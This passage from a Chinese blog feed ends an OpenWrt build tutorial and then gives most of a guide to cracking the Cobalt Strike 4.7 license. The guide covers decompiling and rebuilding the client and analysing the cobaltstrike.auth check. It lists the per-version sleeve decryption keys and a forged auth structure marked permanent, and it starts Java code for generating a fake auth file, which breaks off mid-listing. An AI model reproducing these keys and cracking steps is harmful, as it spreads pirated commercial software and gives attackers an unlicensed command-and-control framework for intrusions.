tmp<br></code></pre></td></tr></table></figure><blockquote><p>  删除执行<code>make menuconfig</code>后产生的一些临时文件，包括一些软件包的检索信息，删除后会重新加载<code>package</code>目录下的软件包。若不删除会导致一些新加入的软件包不显示。</p></blockquote><p>如果要更换架构，建议执行以下命令先深度清理 <code>/bin</code> 和 <code>/build_dir</code> 目录的中的文件 (<code>make clean</code>) 以及 <code>/staging_dir</code>、<code>/toolchain</code>、<code>/tmp</code> 和 <code>/logs</code> 中的文件，然后更换架构。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> clean<br><span class="hljs-built_in">make</span> dirclean<br></code></pre></td></tr></table></figure><p><strong>二次编译</strong></p><p>第一次编译时间较长，后面编译可以用多线程，速度就快很多了。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> defconfig<br><span class="hljs-built_in">make</span> -j8 download<br><span class="hljs-built_in">make</span> -j$(($(nproc) + <span class="hljs-number">1</span>)) V=s<br></code></pre></td></tr></table></figure><p>当然为了防止多线程编译出错，可以使用以下命令，优先使用多线程，报错会自动使用单线程，仍然报错会单线程执行编译并输出详细日志。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> -j$(nproc) || <span class="hljs-built_in">make</span> -j1 || <span class="hljs-built_in">make</span> -j1 V=s<br></code></pre></td></tr></table></figure><h3 id="文件清理"><a href="#文件清理" class="headerlink" title="文件清理"></a>文件清理</h3><p>编译文件清理是根据<code>.config</code>文件配置的，即不同架构配置文件只清理当前配置下的数据，因此需要更换架构时，需要首先执行清理操作，否则可能清理不干净。</p><p>清理 <code>/bin</code> 和 <code>/build_dir</code> 目录的中的文件</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make clean</span><br></code></pre></td></tr></table></figure><p>清理<code>/staging_dir</code>、<code>/toolchain</code>、<code>/tmp</code> 和 <code>/logs</code> 中的文件，然后更换架构。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make dirclean</span><br></code></pre></td></tr></table></figure><blockquote><p>  除非是做开发，并打算 push 到 GitHub 这样的远程仓库，否则几乎用不到。此操作相当于<code>make dirclean</code>外加删除<code>/dl</code>、<code>/feeds</code>目录和<code>.config</code>文件。</p></blockquote><p><strong>还原 Open­Wrt 源码到初始状态</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">git clean -xdf</span><br></code></pre></td></tr></table></figure><blockquote><p>  如果把源码改坏了，或者长时间没有进行编译时使用。</p></blockquote><p><strong>清除临时文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf tmp<br></code></pre></td></tr></table></figure><blockquote><p>  删除执行<code>make menuconfig</code>后产生的一些临时文件，包括一些软件包的检索信息，删除后会重新加载<code>package</code>目录下的软件包。若不删除会导致一些新加入的软件包不显示。</p></blockquote><p>如果要更换架构，建议执行以下命令先深度清理 <code>/bin</code> 和 <code>/build_dir</code> 目录的中的文件 (<code>make clean</code>) 以及 <code>/staging_dir</code>、<code>/toolchain</code>、<code>/tmp</code> 和 <code>/logs</code> 中的文件，然后更换架构。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> clean<br><span class="hljs-built_in">make</span> dirclean<br></code></pre></td></tr></table></figure><h3 id="独立编译插件"><a href="#独立编译插件" class="headerlink" title="独立编译插件"></a>独立编译插件</h3><ul><li><p>进入<code>LuCi</code>–<code>Themes</code>选项找到需要编译的插件，配置选项为<code>M</code>，M 表示选中插件但不编译进固件，保存并退出。</p></li><li><p>获取交叉编译链</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tcl">make tools/install V=s -j$(grep processor /<span class="hljs-keyword">proc</span>/cpuinfo |<span class="hljs-title"> wc</span> -l)<span class="hljs-title"></span><br><span class="hljs-title">make</span> toolchain/install<span class="hljs-title"> V=s</span> -j$(grep<span class="hljs-title"> processor</span> /<span class="hljs-keyword">proc</span>/cpuinfo |<span class="hljs-title"> wc</span> -l)<br></code></pre></td></tr></table></figure></li><li><p>单独编译</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">make <span class="hljs-keyword">package</span><span class="hljs-regexp">/luci-lib-docker/</span><span class="hljs-keyword">compile</span> V=<span class="hljs-number">99</span><br>make <span class="hljs-keyword">package</span><span class="hljs-regexp">/luci-app-dockerman/</span><span class="hljs-keyword">compile</span> V=<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure></li><li><p>编译完成ipk插件包默认存放路径</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>packages<span class="hljs-regexp">/x86_64/</span>base<br></code></pre></td></tr></table></figure></li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://sqmn666.com/archives/openwrt%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B%E5%9C%A8linuxdebianubuntucentos%E4%B8%8B%E7%BC%96%E8%AF%91openwrt">OpenWrt编译教程，在linux（debian&#x2F;ubuntu&#x2F;centos）下编译OpenWrt</a></p><p><a href="https://www.moewah.com/archives/4003.html">OpenWrt 固件自编译教程：从入门到酸爽！</a></p>]]></content>
    
    
    <categories>
      
      <category>教程文档</category>
      
      <category>52折腾</category>
      
      <category>OpenWrt</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>OpenWrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobalt Strike逆向教程</title>
    <link href="/2023/09/23/Guide/Cobalt%20Strike%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B/"/>
    <url>/2023/09/23/Guide/Cobalt%20Strike%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>​这里采用的是Cobalt Strike 4.7原版进行逆向教程（因为我没找到最新版的原版程序），Cobalt Strike 4.7原版sha256校验码如下，其他版本校验码请访问校验码官网校验地址：<a href="https://verify.cobaltstrike.com/">https://verify.cobaltstrike.com/</a></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">cobaltstrike.jar sha<span class="hljs-number">256</span>:<br><br><span class="hljs-keyword">c</span><span class="hljs-number">1</span>cda<span class="hljs-number">82</span>b<span class="hljs-number">39</span>fda<span class="hljs-number">2</span>f<span class="hljs-number">77</span><span class="hljs-keyword">c</span><span class="hljs-number">811</span>f<span class="hljs-number">42</span>a<span class="hljs-number">7</span>a<span class="hljs-number">55987</span>adf<span class="hljs-number">37e06</span>a<span class="hljs-number">522</span>ed<span class="hljs-number">6</span>f<span class="hljs-number">28900</span>d<span class="hljs-number">77</span>bbd<span class="hljs-number">4409</span>f<br></code></pre></td></tr></table></figure><p>windows可使用以下命令获取校验码</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">certutil -hashfile 文件 [md5|<span class="hljs-type">sha1</span>|<span class="hljs-type">sha256</span>]<br></code></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="反编译程序"><a href="#反编译程序" class="headerlink" title="反编译程序"></a>反编译程序</h3><p>​我们原版获取到的<code>Cobalt_Strike</code>原版程序都是客户端与服务端合并在一起的，安装的使用重新进行解压，首先我们先将客户端程序提取出来。将<code>cs_bin</code>目录下的<code>Cobalt_Strike_4.7.jar</code>反编译并将反编译后的文件放在<code>cs_src</code>文件夹中，最终也是生成一个jar文件，不同的是此时jar文件中的<code>class</code>文件全部被反编译为<code>java</code>源程序文件。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java -cp java-decompiler<span class="hljs-selector-class">.jar</span> org<span class="hljs-selector-class">.jetbrains</span><span class="hljs-selector-class">.java</span><span class="hljs-selector-class">.decompiler</span><span class="hljs-selector-class">.main</span><span class="hljs-selector-class">.decompiler</span><span class="hljs-selector-class">.ConsoleDecompiler</span> -dgs=true cs_bin\Cobalt_Strike_4.<span class="hljs-number">7</span><span class="hljs-selector-class">.jar</span> cs_src<br></code></pre></td></tr></table></figure><p>使用压缩软件直接解压反编译后的<code>jar</code>文件，其目录结构如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">E:.<br>│  cobaltstrike-client<span class="hljs-selector-class">.jar</span><br>│  cobaltstrike-client<span class="hljs-selector-class">.md5</span><br>│  cobaltstrike-client<span class="hljs-selector-class">.next</span><span class="hljs-selector-class">.md5</span><br>│  TeamServerImage<br>│  TeamServerImage<span class="hljs-selector-class">.md5</span><br>│  TeamServerImage<span class="hljs-selector-class">.next</span><span class="hljs-selector-class">.md5</span><br>│<br>├─cszip<br>│      CSExtract<span class="hljs-selector-class">.java</span><br>│<br>└─META-INF<br>        MANIFEST.MF<br></code></pre></td></tr></table></figure><p>​看到<code>TeamServerImage</code>是不是有点眼熟呢？<code>TeamServerImage</code>正是服务端的程序，<code>CSExtract.java</code>执行了一些解压操作，这里不做重点；反编译<code>cobaltstrike-client.jar</code>。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java -cp java-decompiler<span class="hljs-selector-class">.jar</span> org<span class="hljs-selector-class">.jetbrains</span><span class="hljs-selector-class">.java</span><span class="hljs-selector-class">.decompiler</span><span class="hljs-selector-class">.main</span><span class="hljs-selector-class">.decompiler</span><span class="hljs-selector-class">.ConsoleDecompiler</span> -dgs=true cs_src\Cobalt_Strike_4.<span class="hljs-number">7</span>\cobaltstrike-client<span class="hljs-selector-class">.jar</span> cs_src\cs_client_src\<br></code></pre></td></tr></table></figure><p>​打开idea，新建项目，创建好后，在项目根目录创建<code>decompiled_src</code>和<code>lib</code>文件夹，分别存放上一步反编译后的<code>cobaltstrike-client.jar</code>和原始未反编译的<code>cobaltstrike-client.jar</code>，将反编译后的<code>cobaltstrike-client.jar</code>解压，项目最终目录结构如下：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">│  .gitignore<br>│  CobaltStrikeCrack.iml<br>│<br>├─.idea<br>│      misc.<span class="hljs-keyword">xml</span><br><span class="hljs-title">│      modules</span>.<span class="hljs-keyword">xml</span><br><span class="hljs-title">│      vcs</span>.<span class="hljs-keyword">xml</span><br><span class="hljs-title">│      workspace</span>.<span class="hljs-keyword">xml</span><br><span class="hljs-title">│</span><br><span class="hljs-title">├─decompiled_src</span><br>│  │  cobaltstrike-client.jar<br>│  │<br>│  └─cobaltstrike-client<br>│      <br>├─lib<br>│      cobaltstrike-client.jar<br>│<br>└─src<br></code></pre></td></tr></table></figure><h3 id="添加项目依赖"><a href="#添加项目依赖" class="headerlink" title="添加项目依赖"></a>添加项目依赖</h3><p>选择<code>File-&gt;Project Structure-&gt;Modules</code>对<code>Dependencies</code>进行设置，点击+号选择<code>JARs or Directories...</code></p><p><img src="https://img-blog.csdnimg.cn/direct/8a776b37618f4990abefd61d2ab58d32.png" alt="image-20230923172941606"></p><p>选择<code>lib</code>中的<code>cobaltstrike-client.jar</code>，点击ok，确定<code>export</code>打勾，点击ok，程序反编译完成。</p><p><img src="https://img-blog.csdnimg.cn/direct/14852ed34e6f48069ce5162217b3ad71.png" alt="image-20230923173025005"></p><h3 id="构建工件"><a href="#构建工件" class="headerlink" title="构建工件"></a>构建工件</h3><p>打开<code>lib-&gt;META-INF-&gt;MANIFEST.MF</code>，可以看到Main Class，复制<code>aggressor.Aggressor</code></p><p><img src="https://img-blog.csdnimg.cn/direct/e44e20aa44d44027974fbee2b8d87006.png" alt="image-20230923202619073"></p><p>进入<code>File-&gt;Project Structure-&gt;Artifacts—&gt;JAR—&gt;From modules with dependencies</code>。</p><p><img src="https://img-blog.csdnimg.cn/direct/556abfe27a664bc6a376a732f2739e42.png" alt="image-20230923202314413"></p><p>在<code>Main Class</code>处内填写上面获得的主类名称，点击ok。</p><p><img src="https://img-blog.csdnimg.cn/direct/6346e5d49f404931a3bd0bd7952732d1.png" alt="image-20230923202341832"></p><p>​此时<code>src</code>目录下生成<code>META-INF</code>配置，打开<code>MANIFEST.MF</code>，将<code>decompiled_src/cobaltstrike-client/META-INF/MANIFEST.MF</code>的内容复制粘贴覆盖，至此工件构建配置完成。</p><h3 id="源码编译测试"><a href="#源码编译测试" class="headerlink" title="源码编译测试"></a>源码编译测试</h3><p>进入<code>ecompiled_src/cobaltstrike-client/aggressor/Aggressor.java</code>，右键选择<code>Refactor-&gt;Copy File</code>，在<code>src</code>目录中新建相同路径，即可将<code>Aggressor.java</code>至我们的项目中。</p><p><img src="https://img-blog.csdnimg.cn/direct/5178070bacb24a1da37b620dd854da16.png" alt="image-20230923203008559"></p><p>此时，可以通过<code>Build—&gt;Build Artifacts—&gt;Build</code>进行工件编译，点击<code>Run-&gt;Profile-&gt;Edit Configurations...</code>设置运行参数。</p><p>点击+号，选择<code>JAR Application</code>，名字自己定义；<code>Path to JAR</code>选项目生成的<code>jar</code>文件；<code>VM options</code>设置为<code>-XX:+AggressiveHeap -XX:+UseParallelGC</code>。</p><p><img src="https://img-blog.csdnimg.cn/direct/62474be440794507bd87fcd9aa15a89d.png" alt="image-20230923204356838"></p><p>此时，直接运行项目不报错，且弹框输出<code>Your authorization file is not vaild.</code>，证明项目运行成功。</p><h2 id="密钥文件生成"><a href="#密钥文件生成" class="headerlink" title="密钥文件生成"></a>密钥文件生成</h2><p>各版本key：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">27, <span class="hljs-string">-27</span>, <span class="hljs-string">-66</span>, 82, <span class="hljs-string">-58</span>, 37, 92, 51, 85, <span class="hljs-string">-114</span>, <span class="hljs-string">-118</span>, 28, <span class="hljs-string">-74</span>, 103, <span class="hljs-string">-53</span>, 6,        // 4.0 key<br><span class="hljs-string">-128</span>, <span class="hljs-string">-29</span>, 42, 116, 32, 96, <span class="hljs-string">-72</span>, <span class="hljs-string">-124</span>, 65, <span class="hljs-string">-101</span>, <span class="hljs-string">-96</span>, <span class="hljs-string">-63</span>, 113, <span class="hljs-string">-55</span>, <span class="hljs-string">-86</span>, 118,  // 4.1 key<br><span class="hljs-string">-78</span>, 13, 72, 122, <span class="hljs-string">-35</span>, <span class="hljs-string">-44</span>, 113, 52, 24, <span class="hljs-string">-14</span>, <span class="hljs-string">-43</span>, <span class="hljs-string">-93</span>, <span class="hljs-string">-82</span>, 2, <span class="hljs-string">-89</span>, <span class="hljs-string">-96</span>,       // 4.2 key<br>58, 68, 37, 73, 15, 56, <span class="hljs-string">-102</span>, <span class="hljs-string">-18</span>, <span class="hljs-string">-61</span>, 18, <span class="hljs-string">-67</span>, <span class="hljs-string">-41</span>, 88, <span class="hljs-string">-83</span>, 43, <span class="hljs-string">-103</span>,     // 4.3 key<br>94, <span class="hljs-string">-104</span>, 25, 74, 1, <span class="hljs-string">-58</span>, <span class="hljs-string">-76</span>, <span class="hljs-string">-113</span>, <span class="hljs-string">-91</span>, <span class="hljs-string">-126</span>, <span class="hljs-string">-90</span>, <span class="hljs-string">-87</span>, <span class="hljs-string">-4</span>, <span class="hljs-string">-69</span>, <span class="hljs-string">-110</span>, <span class="hljs-string">-42</span>,   // 4.4 key<br><span class="hljs-string">-13</span>, <span class="hljs-string">-114</span>, <span class="hljs-string">-77</span>, <span class="hljs-string">-47</span>, <span class="hljs-string">-93</span>, 53, <span class="hljs-string">-78</span>, 82, <span class="hljs-string">-75</span>, <span class="hljs-string">-117</span>, <span class="hljs-string">-62</span>, <span class="hljs-string">-84</span>, <span class="hljs-string">-34</span>, <span class="hljs-string">-127</span>, <span class="hljs-string">-75</span>, 66, // 4.5 key<br><span class="hljs-string">-122</span>, 56, <span class="hljs-string">-75</span>, 17, <span class="hljs-string">-32</span>, 91, 85, 123, <span class="hljs-string">-7</span>, 112, <span class="hljs-string">-60</span>, 24, 53, 109, 68, <span class="hljs-string">-12</span>         // 4.7 key<br><span class="hljs-string">-118</span>, 9, <span class="hljs-string">-22</span>, <span class="hljs-string">-51</span>, <span class="hljs-string">-53</span>, 27, 95, 70, <span class="hljs-string">-99</span>, <span class="hljs-string">-54</span>, 53, 124, <span class="hljs-string">-9</span>, <span class="hljs-string">-7</span>, <span class="hljs-string">-26</span>, 74          // 4.8 key<br>// 4.9 key<br></code></pre></td></tr></table></figure><p><strong>cobaltstrike.auth</strong>认证密钥文件，rsa加密，大端存放，解密内容：</p><p>4.7</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-string">-54</span>, <span class="hljs-string">-2</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-45</span>, //文件头<br>0, <span class="hljs-string">-54</span>,//后续长度<br>1, <span class="hljs-string">-55</span>, <span class="hljs-string">-61</span>, 127, // 证书有效时间，永久有效<br>23, 80, 101, <span class="hljs-string">-22</span>, // watermask<br>47, // 版本号 47<br>16, 27, <span class="hljs-string">-27</span>, <span class="hljs-string">-66</span>, 82, <span class="hljs-string">-58</span>, 37, 92, 51, 85, <span class="hljs-string">-114</span>, <span class="hljs-string">-118</span>, 28, <span class="hljs-string">-74</span>, 103, <span class="hljs-string">-53</span>, 6,        // 4.0 key<br>16, <span class="hljs-string">-128</span>, <span class="hljs-string">-29</span>, 42, 116, 32, 96, <span class="hljs-string">-72</span>, <span class="hljs-string">-124</span>, 65, <span class="hljs-string">-101</span>, <span class="hljs-string">-96</span>, <span class="hljs-string">-63</span>, 113, <span class="hljs-string">-55</span>, <span class="hljs-string">-86</span>, 118,  // 4.1 key<br>16, <span class="hljs-string">-78</span>, 13, 72, 122, <span class="hljs-string">-35</span>, <span class="hljs-string">-44</span>, 113, 52, 24, <span class="hljs-string">-14</span>, <span class="hljs-string">-43</span>, <span class="hljs-string">-93</span>, <span class="hljs-string">-82</span>, 2, <span class="hljs-string">-89</span>, <span class="hljs-string">-96</span>,       // 4.2 key<br>16, 58, 68, 37, 73, 15, 56, <span class="hljs-string">-102</span>, <span class="hljs-string">-18</span>, <span class="hljs-string">-61</span>, 18, <span class="hljs-string">-67</span>, <span class="hljs-string">-41</span>, 88, <span class="hljs-string">-83</span>, 43, <span class="hljs-string">-103</span>,     // 4.3 key<br>16, 94, <span class="hljs-string">-104</span>, 25, 74, 1, <span class="hljs-string">-58</span>, <span class="hljs-string">-76</span>, <span class="hljs-string">-113</span>, <span class="hljs-string">-91</span>, <span class="hljs-string">-126</span>, <span class="hljs-string">-90</span>, <span class="hljs-string">-87</span>, <span class="hljs-string">-4</span>, <span class="hljs-string">-69</span>, <span class="hljs-string">-110</span>, <span class="hljs-string">-42</span>,   // 4.4 key<br>16, <span class="hljs-string">-13</span>, <span class="hljs-string">-114</span>, <span class="hljs-string">-77</span>, <span class="hljs-string">-47</span>, <span class="hljs-string">-93</span>, 53, <span class="hljs-string">-78</span>, 82, <span class="hljs-string">-75</span>, <span class="hljs-string">-117</span>, <span class="hljs-string">-62</span>, <span class="hljs-string">-84</span>, <span class="hljs-string">-34</span>, <span class="hljs-string">-127</span>, <span class="hljs-string">-75</span>, 66, // 4.5 key<br>0, 0, 0, 24, // watermask length<br>105, 100, 118, 121, 85, 97, 77, 68, 75, 117, 98, 87, 87, 52, 84, 76, 51, 105, 80, 106, 66, 119, 61, 61, // watermask ascii base64<br>16, <span class="hljs-string">-71</span>, <span class="hljs-string">-86</span>, 51, 8, 10, 90, <span class="hljs-string">-112</span>, 49, 62, <span class="hljs-string">-15</span>, <span class="hljs-string">-99</span>, <span class="hljs-string">-64</span>, 98, 125, 46, <span class="hljs-string">-95</span>, <br>28, <br>115, 53, 57, 108, 53, 105, 113, 49, 101, 106, 90, 51, 79, 81, 100, 47, 115, 103, 118, 78, 97, 103, 61, 61, 113, <span class="hljs-string">-112</span>, <span class="hljs-string">-42</span>, 104, <br>16, // 4.7 sleeve key length<br><span class="hljs-string">-122</span>, 56, <span class="hljs-string">-75</span>, 17, <span class="hljs-string">-32</span>, 91, 85, 123, <span class="hljs-string">-7</span>, 112, <span class="hljs-string">-60</span>, 24, 53, 109, 68, <span class="hljs-string">-12</span> // key<br></code></pre></td></tr></table></figure><h3 id="CobaltStrike-client破解"><a href="#CobaltStrike-client破解" class="headerlink" title="CobaltStrike client破解"></a>CobaltStrike client破解</h3><ul><li><p>在<code>aggressor/Aggressor.main</code>中调用<code>License.checkLicenseGUI(new Authorization());</code>开始证书验证。</p></li><li><p>&#96;&#96;Authorization<code>类中是</code>cobaltstrike.auth<code>文件的处理，读取文件内容,创建</code>AuthCrypto类<code>，对</code>cobaltstrike.auth<code>进行MD5验证，并使用</code>RSA&#x2F;ECB&#x2F;PKCS1Padding&#96;进行RSA解密。</p><p><img src="https://img-blog.csdnimg.cn/direct/1f023f4446a14303aadd97df9a9f7e30.png" alt="image-20231002131410814"></p></li><li><p>调用<code>AuthCrypto().decrypt</code>对内容进行处理：</p><p><img src="https://img-blog.csdnimg.cn/direct/ee04d9451809402fbc27dd0d9f59bc97.png" alt="image-20231002131104667"></p></li><li><p>前四个字节证书文件头，在<code>common.AutoCrypto.decrypt</code>进行验证（-889274181为3.x版本；-889274157为4.x版本），读取后两个字节作为<code>auth</code>长度，存入<code>var6</code>中并返回。</p><p><img src="https://img-blog.csdnimg.cn/direct/530af4d201444ae885f315e4babfb698.png" alt="image-20231002131134484"></p></li><li><p>从解密数据中获取<code>watermark</code>、版本号以及watermarkHash，并跳过之前版本的密钥。</p><p><img src="https://img-blog.csdnimg.cn/direct/42014d01b09b4d358fe3556db4c48a03.png" alt="image-20231002132300627"></p></li><li><p>获取过期时间，29999999表示永久证书，并将key传入<code>SleevedResource.Setup</code>进行数据解密。</p><p><img src="https://img-blog.csdnimg.cn/direct/902974f11ef84eb39e6df3d8eb0481c5.png" alt="image-20231002132514771"></p></li><li><p>在<code>Authorization</code>类中调用<code>SleevedResource.Setup</code>方法对<code>arrayOfByte6</code>进行处理。在<code>this.A.registerKey</code>中把key设定为AES、HmacSHA256解密的秘钥，在<code>this.A</code>中的<code>this.A.decrypt(var3)</code>进行解密调用，解密的内容为<code>/sleeve/</code>中的dll文件：</p><p><img src="https://img-blog.csdnimg.cn/direct/a8342b6d47a64d68a96b2aedaf612f77.png" alt="image-20231002132855178"></p><p><img src="https://img-blog.csdnimg.cn/direct/85b0d2f85b1c4abebb68f3bf7d413372.png" alt="image-20231002132738793"></p><ul><li>整个密钥文件内容分析流程到此结束，可以知道比较关键的内容就是证书有效时间和解密key，解密key只能通过分析正版的auth文件获取。</li></ul></li></ul><p>可以直接使用使用大佬的代码生成密钥文件。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs subunit">import javax.crypto.BadPaddingException;<br>import javax.crypto.Cipher;<br>import javax.crypto.IllegalBlockSizeException;<br>import javax.crypto.NoSuchPaddingException;<br>import java.io.*;<br>import java.security.*;<br><br>public class RSAKeyPairGenerator &#123;<br>    private PrivateKey privateKey;<br>    private PublicKey publicKey;<br><br>    public RSAKeyPairGenerator() throws NoSuchAlgorithmException &#123;<br>        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(&quot;RSA&quot;);<br>        keyGen.initialize(2048);<br>        KeyPair pair = keyGen.generateKeyPair();<br>        this.privateKey = pair.getPrivate();<br>        this.publicKey = pair.getPublic();<br>    &#125;<br><br>    // 将byte 写入文件<br>    public void byte2File(String path, byte[] data) throws IOException &#123;<br>        File f = new File(path);<br>        f.getParentFile().mkdirs();<br><br>        FileOutputStream fos = new FileOutputStream(f);<br>        fos.write(data);<br>        fos.flush();<br>        fos.close();<br>    &#125;<br><br>    public PrivateKey getPrivateKey() &#123;<br>        return privateKey;<br>    &#125;<br><br>    public PublicKey getPublicKey() &#123;<br>        return publicKey;<br>    &#125;<br><br>    // 加密数据<br>    public byte[] encryptPri(byte[] data, PrivateKey privateKey) throws BadPaddingException, IllegalBlockSizeException, InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException &#123;<br>        Cipher cipher = Cipher.getInstance(&quot;RSA/ECB/PKCS1Padding&quot;);<br>        cipher.init(Cipher.ENCRYPT_MODE, this.privateKey);<br>        return cipher.doFinal(data);<br>    &#125;<br><br>    public static void main(String[] args) throws NoSuchAlgorithmException, IOException, IllegalBlockSizeException, InvalidKeyException, NoSuchPaddingException, BadPaddingException &#123;<br>        RSAKeyPairGenerator PairGenerator = new RSAKeyPairGenerator();<br>        //byte[] data = &#123;<span class="hljs-string">-54</span>, <span class="hljs-string">-2</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-45</span>, 0, 77, 1, <span class="hljs-string">-55</span>, <span class="hljs-string">-61</span>, 127, 0, 0, 0, 1, 43, 16, 58, 68, 37, 73, 15, 56, <span class="hljs-string">-102</span>, <span class="hljs-string">-18</span>, <span class="hljs-string">-61</span>, 18, <span class="hljs-string">-67</span>, <span class="hljs-string">-41</span>, 88, <span class="hljs-string">-83</span>, 43, <span class="hljs-string">-103</span> &#125;;<br>        // byte[] data =&#123;<br>        //         <span class="hljs-string">-54</span>, <span class="hljs-string">-2</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-45</span>,<br>        //         0, 77, 1, <span class="hljs-string">-55</span>, <span class="hljs-string">-61</span>,<br>        //         127,<br>        //    